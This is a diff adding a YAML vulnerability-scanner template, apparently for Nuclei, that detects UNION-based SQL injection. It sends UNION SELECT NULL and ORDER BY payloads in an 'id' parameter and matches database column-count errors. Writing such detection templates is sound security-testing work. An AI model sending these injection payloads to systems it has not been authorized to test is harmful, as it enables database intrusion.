@@ -1,0 +1,34 @@
+id: whai-sqli-union-columns
+
+info:
+  name: UNION-Based SQL Injection Column Enumeration
+  author: whitehat-ai
+  severity: critical
+  description: Probes UNION SELECT with varying column counts to discover injectable endpoints
+  tags: sqli,union,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1%20UNION%20SELECT%20NULL--%20-"
+      - "{{BaseURL}}/?id=1%20UNION%20SELECT%20NULL,NULL--%20-"
+      - "{{BaseURL}}/?id=1%20UNION%20SELECT%20NULL,NULL,NULL--%20-"
+      - "{{BaseURL}}/?id=1%20UNION%20SELECT%20NULL,NULL,NULL,NULL--%20-"
+      - "{{BaseURL}}/?id=1%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL--%20-"
+      - "{{BaseURL}}/?id=1%20ORDER%20BY%2010--%20-"
+      - "{{BaseURL}}/?id=1%20ORDER%20BY%2050--%20-"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(the used select statements have a different number of columns)"
+          - "(?i)(each union query must have the same number of columns)"
+          - "(?i)(unknown column)"
+          - "(?i)(UNION.*SELECT)"
+          - "(?i)(NULL.*NULL)"
+        condition: or
